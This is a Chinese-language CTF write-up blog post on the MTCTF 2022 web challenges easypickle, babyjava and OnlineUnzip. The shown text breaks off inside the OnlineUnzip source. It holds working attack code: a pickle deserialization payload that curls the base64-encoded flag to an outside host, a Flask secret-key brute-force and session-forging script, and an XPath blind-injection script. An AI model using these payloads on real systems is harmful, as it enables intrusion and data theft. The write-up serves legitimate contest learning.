<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Keep going!  Webeasypickle1234567891011121314151617181920212223242526272829303132333435import base64import picklefrom flask import Flask, sessionimport osimport randomapp &#x3D; Flask(__name__)app.config[">
<meta property="og:type" content="article">
<meta property="og:title" content="NS - MTCTF 2022">
<meta property="og:url" content="http://w1mps.github.io/2022/09/17/MTCTF%202022/index.html">
<meta property="og:site_name" content="Trashbox 4 outx!">
<meta property="og:description" content="Keep going!  Webeasypickle1234567891011121314151617181920212223242526272829303132333435import base64import picklefrom flask import Flask, sessionimport osimport randomapp &#x3D; Flask(__name__)app.config[">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2022-09-17T02:39:40.000Z">
<meta property="article:modified_time" content="2022-09-18T03:43:57.109Z">
<meta property="article:author" content="outx">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="Web">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>NS - MTCTF 2022</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 5.4.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/paper/">Paper</a></li>
         
          <li><a href="/archives/">Archives</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post " href="/2022/09/28/CS%20RCE/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post " href="/2022/08/22/QWB%202022%20FINAL/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://w1mps.github.io/2022/09/17/MTCTF%202022/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://w1mps.github.io/2022/09/17/MTCTF%202022/&text=NS - MTCTF 2022"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://w1mps.github.io/2022/09/17/MTCTF%202022/&title=NS - MTCTF 2022"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://w1mps.github.io/2022/09/17/MTCTF%202022/&is_video=false&description=NS - MTCTF 2022"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=NS - MTCTF 2022&body=Check out this article: http://w1mps.github.io/2022/09/17/MTCTF%202022/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://w1mps.github.io/2022/09/17/MTCTF%202022/&title=NS - MTCTF 2022"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://w1mps.github.io/2022/09/17/MTCTF%202022/&title=NS - MTCTF 2022"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://w1mps.github.io/2022/09/17/MTCTF%202022/&title=NS - MTCTF 2022"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://w1mps.github.io/2022/09/17/MTCTF%202022/&title=NS - MTCTF 2022"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://w1mps.github.io/2022/09/17/MTCTF%202022/&name=NS - MTCTF 2022&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://w1mps.github.io/2022/09/17/MTCTF%202022/&t=NS - MTCTF 2022"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#easypickle"><span class="toc-number">1.1.</span> <span class="toc-text">easypickle</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyjava"><span class="toc-number">1.2.</span> <span class="toc-text">babyjava</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OnlineUnzip"><span class="toc-number">1.3.</span> <span class="toc-text">OnlineUnzip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyjava"><span class="toc-number">1.4.</span> <span class="toc-text">easyjava</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        NS - MTCTF 2022
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">outx</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2022-09-17T02:39:40.000Z" itemprop="datePublished">2022-09-17</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/Notes/">Notes</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="tag-link-link" href="/tags/Web/" rel="tag">Web</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <blockquote>
<p>Keep going!</p>
</blockquote>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="easypickle"><a href="#easypickle" class="headerlink" title="easypickle"></a>easypickle</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import pickle</span><br><span class="line">from flask import Flask, session</span><br><span class="line">import os</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[&#x27;SECRET_KEY&#x27;] = os.urandom(2).hex()</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def hello_world():</span><br><span class="line">    if not session.get(&#x27;user&#x27;):</span><br><span class="line">        session[&#x27;user&#x27;] = &#x27;&#x27;.join(random.choices(&quot;admin&quot;, k=5))</span><br><span class="line">    return &#x27;Hello &#123;&#125;!&#x27;.format(session[&#x27;user&#x27;])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/admin&#x27;)</span><br><span class="line">def admin():</span><br><span class="line">    if session.get(&#x27;user&#x27;) == &quot;admin&quot;:</span><br><span class="line">        return f&quot;&lt;script&gt;alert(&#x27;Access Denied&#x27;);window.location.href=&#x27;/&#x27;&lt;/script&gt;&quot;</span><br><span class="line">    else:</span><br><span class="line">        try:</span><br><span class="line">            a = base64.b64decode(session.get(&#x27;ser_data&#x27;)).replace(b&quot;builtin&quot;, b&quot;BuIltIn&quot;).replace(b&quot;os&quot;, b&quot;Os&quot;).replace(b&quot;bytes&quot;, b&quot;Bytes&quot;)</span><br><span class="line">            if b&#x27;R&#x27; in a or b&#x27;i&#x27; in a or b&#x27;o&#x27; in a or b&#x27;b&#x27; in a:</span><br><span class="line">                raise pickle.UnpicklingError(&quot;R i o b is forbidden&quot;)</span><br><span class="line">            pickle.loads(base64.b64decode(session.get(&#x27;ser_data&#x27;)))</span><br><span class="line">            return &quot;ok&quot;</span><br><span class="line">        except Exception as e:</span><br><span class="line">            print(e)</span><br><span class="line">            return &quot;error!&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, port=8888)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>源码如上，secret_key长度为16位，共65536个情况，爆破一下就行，爆破完了绕过一下pickle反序列化的限制，这里利用他会把os换成Os绕过即可，最后的报错不会影响正常反序列化即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">opcode3=b&#x27;&#x27;&#x27;(cos</span><br><span class="line">system</span><br><span class="line">S&#x27;curl -d x=`cat flag|/usr/??n/?ase64` http://xxx:8888&#x27;</span><br><span class="line">os.&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">ser_data = base64.b64encode(opcode3)</span><br><span class="line">print(ser_data)</span><br><span class="line"></span><br><span class="line">a = base64.b64decode(ser_data).replace(b&quot;builtin&quot;, b&quot;BuIltIn&quot;).replace(b&quot;os&quot;, b&quot;Os&quot;).replace(b&quot;bytes&quot;, b&quot;Bytes&quot;)</span><br><span class="line">print(a)</span><br><span class="line">if b&#x27;R&#x27; in a or b&#x27;i&#x27; in a or b&#x27;o&#x27; in a or b&#x27;b&#x27; in a:</span><br><span class="line">    raise pickle.UnpicklingError(&quot;R i o b is forbidden&quot;)</span><br><span class="line">pickle.loads(base64.b64decode(ser_data))</span><br></pre></td></tr></table></figure>

<p>整体脚本，懒得美化了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line">import requests</span><br><span class="line">from abc import ABC, abstractmethod</span><br><span class="line">from flask.sessions import SecureCookieSessionInterface</span><br><span class="line">import ast</span><br><span class="line">from itsdangerous import base64_decode</span><br><span class="line">import zlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class MockApp(object):</span><br><span class="line"></span><br><span class="line">    def __init__(self, secret_key):</span><br><span class="line">        self.secret_key = secret_key</span><br><span class="line"></span><br><span class="line">class FSCM(ABC):</span><br><span class="line">    def encode(secret_key, session_cookie_structure):</span><br><span class="line">        &quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span><br><span class="line">        try:</span><br><span class="line">            app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">            session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))</span><br><span class="line">            si = SecureCookieSessionInterface()</span><br><span class="line">            s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">            return s.dumps(session_cookie_structure)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            return &quot;[Encoding error] &#123;&#125;&quot;.format(e)</span><br><span class="line">            raise e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def decode(session_cookie_value, secret_key=None):</span><br><span class="line">        &quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span><br><span class="line">        try:</span><br><span class="line">            if(secret_key==None):</span><br><span class="line">                compressed = False</span><br><span class="line">                payload = session_cookie_value</span><br><span class="line"></span><br><span class="line">                if payload.startswith(&#x27;.&#x27;):</span><br><span class="line">                    compressed = True</span><br><span class="line">                    payload = payload[1:]</span><br><span class="line"></span><br><span class="line">                data = payload.split(&quot;.&quot;)[0]</span><br><span class="line"></span><br><span class="line">                data = base64_decode(data)</span><br><span class="line">                if compressed:</span><br><span class="line">                    data = zlib.decompress(data)</span><br><span class="line"></span><br><span class="line">                return data</span><br><span class="line">            else:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                return s.loads(session_cookie_value)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            return &quot;[Decoding error] &#123;&#125;&quot;.format(e)</span><br><span class="line">            raise e</span><br><span class="line"></span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def job1(start,stop):</span><br><span class="line">    data = &#x27;&#123;&quot;user&quot;:&quot;admin&quot;&#125;&#x27;</span><br><span class="line"></span><br><span class="line">    for k in range(start,stop):</span><br><span class="line">        key = k.to_bytes(2,&#x27;big&#x27;).hex()</span><br><span class="line">        cookie = &#123;</span><br><span class="line">            &quot;session&quot;: FSCM.encode(key, data)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        resp = requests.get(url=&quot;http://eci-2ze5la2t5773gt9jqm0e.cloudeci1.ichunqiu.com:8888&quot;, cookies=cookie, timeout=5)</span><br><span class="line">        if &#x27;Set-Cookie&#x27; not in resp.headers:</span><br><span class="line">            print(key,cookie,k)</span><br><span class="line">            exit()</span><br><span class="line">        else:</span><br><span class="line">            print(k,resp.text,resp.headers[&#x27;Set-Cookie&#x27;])</span><br><span class="line">            resp.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    # # 创建一个新的线程</span><br><span class="line">    # new_thread1 = threading.Thread(target=job1, name=&quot;T1&quot;,args=(12983,16384,))</span><br><span class="line">    # new_thread2 = threading.Thread(target=job1, name=&quot;T2&quot;,args=(16384,32768,))</span><br><span class="line">    # new_thread3 = threading.Thread(target=job1, name=&quot;T3&quot;,args=(32768,49152,))</span><br><span class="line">    # new_thread4 = threading.Thread(target=job1, name=&quot;T4&quot;,args=(49152,65536,))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    # # 启动新线程</span><br><span class="line">    # new_thread1.start()</span><br><span class="line">    # new_thread2.start()</span><br><span class="line">    # new_thread3.start()</span><br><span class="line">    # new_thread4.start()</span><br><span class="line">    # print(&quot;当前线程数量为&quot;, threading.active_count())</span><br><span class="line">    # print(&quot;所有线程的具体信息&quot;, threading.enumerate())</span><br><span class="line">    # print(&quot;当前线程具体信息&quot;, threading.current_thread())</span><br><span class="line"></span><br><span class="line">    # # 448f &#123;&#x27;session&#x27;: &#x27;eyJ1c2VyIjoiYWRtaW4ifQ.YyVArg.ZY1iuf3_Iwt6NuKcCAAO0k1E4Ww&#x27;&#125; 17551</span><br><span class="line">    key = &quot;448f&quot;</span><br><span class="line">    data = &#x27;&#123;&quot;user&quot;:&quot;admin&quot;,&quot;ser_data&quot;:&quot;KGNvcwpzeXN0ZW0KUydjdXJsIC1kIHg9YGNhdCBmbGFnfC91c3IvPz9uLz9hc2U2NGAgaHR0cDovLzY3LjIxNi4yMDAuMTk0Ojg4ODgnCm9zLg==&quot;&#125;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    cookie = &#123;</span><br><span class="line">            &quot;session&quot;: FSCM.encode(key, data)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    resp = requests.get(url=&quot;http://eci-2ze5la2t5773gt9jqm0e.cloudeci1.ichunqiu.com:8888/admin&quot;, cookies=cookie)</span><br><span class="line">    print(resp.text)</span><br></pre></td></tr></table></figure>

<h3 id="babyjava"><a href="#babyjava" class="headerlink" title="babyjava"></a>babyjava</h3><p>XPath Bool盲注，对错标志为是否查询返回user1，简单脚本如下，同样是懒得美化</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"># coding: utf-8</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://eci-2zed9l1z895tjlkmw6fs.cloudeci1.ichunqiu.com:8888/hello&quot;</span><br><span class="line">headers  =&#123;</span><br><span class="line">    &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;</span><br><span class="line">&#125;</span><br><span class="line">proxies = &#123;</span><br><span class="line">    &quot;http&quot;:&quot;127.0.0.1:8080&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line">adict=&quot;qwertyuiopasdfghjklzxcvbnm0123456789\&#123;\&#125;-&quot;</span><br><span class="line">for l in range(1,64):</span><br><span class="line">    for k in adict:</span><br><span class="line">        # data = &#123;</span><br><span class="line">        #     &quot;xpath&quot;: &quot;&#x27;or count(/)=&#123;&#125; and &#x27;&#x27;=&#x27;&quot;.format(k) # 1</span><br><span class="line">        # &#125;</span><br><span class="line">        # data = &#123;</span><br><span class="line">        #     &quot;xpath&quot;: &quot;&#x27;or count(/*)=&#123;&#125; and &#x27;&#x27;=&#x27;&quot;.format(k) # 1</span><br><span class="line">        # &#125;</span><br><span class="line">        # data = &#123;</span><br><span class="line">        #     &quot;xpath&quot;: &quot;&#x27;or string-length(name(/*[1]))=&#123;&#125; and &#x27;&#x27;=&#x27;&quot;.format(k) # 4</span><br><span class="line">        # &#125;</span><br><span class="line">        # data = &#123;</span><br><span class="line">        #     &quot;xpath&quot;: &quot;&#x27;or substring(name(/*[1]), 4, 1)=&#x27;&#123;&#125;&#x27; and &#x27;&#x27;=&#x27;&quot;.format(k) # root</span><br><span class="line">        # &#125;</span><br><span class="line">        # data = &#123;</span><br><span class="line">        #     &quot;xpath&quot;: &quot;&#x27;or count(/root/user/username)=&#123;&#125; and &#x27;&#x27;=&#x27;&quot;.format(k) # 4</span><br><span class="line">        # &#125;</span><br><span class="line">        # data = &#123;</span><br><span class="line">        #     &quot;xpath&quot;: &quot;&#x27;or substring(name(/root/*[1]), 1, 1)=&#x27;&#123;&#125;&#x27; and &#x27;&#x27;=&#x27;&quot;.format(k) # user</span><br><span class="line">        # &#125;</span><br><span class="line">        # data = &#123;</span><br><span class="line">        #     &quot;xpath&quot;: &quot;&#x27;or count(/root/user)=&#123;&#125; and &#x27;&#x27;=&#x27;&quot;.format(k) # 1</span><br><span class="line">        # &#125;</span><br><span class="line">        # data = &#123;</span><br><span class="line">        #     &quot;xpath&quot;: &quot;&#x27;or string-length(name(/root/user[position()=1]/*[3]))=&#123;&#125; and &#x27;&#x27;=&#x27;&quot;.format(k) # 8 8 username username?</span><br><span class="line">        # &#125;</span><br><span class="line">        data = &#123;</span><br><span class="line">            &quot;xpath&quot;: &quot;&#x27;or substring((//user[position()=1]/username[position()=2]),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; and &#x27;&#x27;=&#x27;&quot;.format(l,k) # user1</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        resp = requests.post(url, data=data)</span><br><span class="line">        # print(resp.text)</span><br><span class="line">        if &quot;&lt;p&gt;user1&quot; in resp.text:</span><br><span class="line">            flag.append(k)</span><br><span class="line">            print(k)</span><br><span class="line">            if k == &quot;&#125;&quot;:</span><br><span class="line">                exit()</span><br><span class="line">            break</span><br><span class="line">print(&#x27;&#x27;.join(flag))</span><br></pre></td></tr></table></figure>

<h3 id="OnlineUnzip"><a href="#OnlineUnzip" class="headerlink" title="OnlineUnzip"></a>OnlineUnzip</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import re</span><br><span class="line">from hashlib import md5</span><br><span class="line">from flask import Flask, redirect, request, render_template, url_for, make_response</span><br><span class="line"></span><br><span class="line">app=Flask(__name__)</span><br><span class="line"></span><br><span class="line">def extractFile(filepath):</span><br><span class="line">    extractdir=filepath.split(&#x27;.&#x27;)[0]</span><br><span class="line">    if not os.path.exists(extractdir):</span><br><span class="line">        os.makedirs(extractdir)</span><br><span class="line">    os.system(f&#x27;unzip -o &#123;filepath&#125; -d &#123;extractdir&#125;&#x27;)</span><br><span class="line">    return redirect(url_for(&#x27;display&#x27;,extractdir=extractdir))</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&#x27;index.html&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/display&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">@app.route(&#x27;/display/&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">@app.route(&#x27;/display/&lt;path:extractdir&gt;&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def display(extractdir=&#x27;&#x27;):</span><br><span class="line">    if re.search(r&quot;\.\.&quot;, extractdir, re.M | re.I) != None:</span><br><span class="line">        return &quot;Hacker?&quot;</span><br><span class="line">    else:</span><br><span class="line">        if not os.path.exists(extractdir):</span><br><span class="line">            return make_response(&quot;error&quot;, 404)</span><br><span class="line">        else:</span><br><span class="line">            if not os.path.isdir(extractdir):</span><br><span class="line">                f = open(extractdir, &#x27;rb&#x27;)</span><br><span class="line">                response = make_response(f.read())</span><br><span class="line">                response.headers[&#x27;Content-Type&#x27;] = &#x27;application/octet-stream&#x27;</span><br><span class="line">                return response</span><br><span class="line">            else:</span><br><span class="line">                fn = os.listdir(extractdir)</span><br><span class="line">                fn = [&quot;..&quot;] + fn</span><br><span class="line">                f = open(&quot;templates/template.html&quot;)</span><br><span class="line">                x = f.read()</span><br><span class="line">                f.close()</span><br><span class="line">                ret = &quot;&lt;h1&gt;文件列表:&lt;/h1&gt;&lt;br&gt;&lt;hr&gt;&quot;</span><br><span class="line">                for i in fn:</span><br><span class="line">                    tpath = os.path.join(&#x27;/display&#x27;, extractdir, i)</span><br><span class="line">                    ret += &quot;&lt;a href=&#x27;&quot; + tpath + &quot;&#x27;&gt;&quot; + i + &quot;&lt;/a&gt;&lt;br&gt;&quot;</span><br><span class="line">                x = x.replace(&quot;HTMLTEXT&quot;, ret)</span><br><span class="line">                return x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/upload&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def 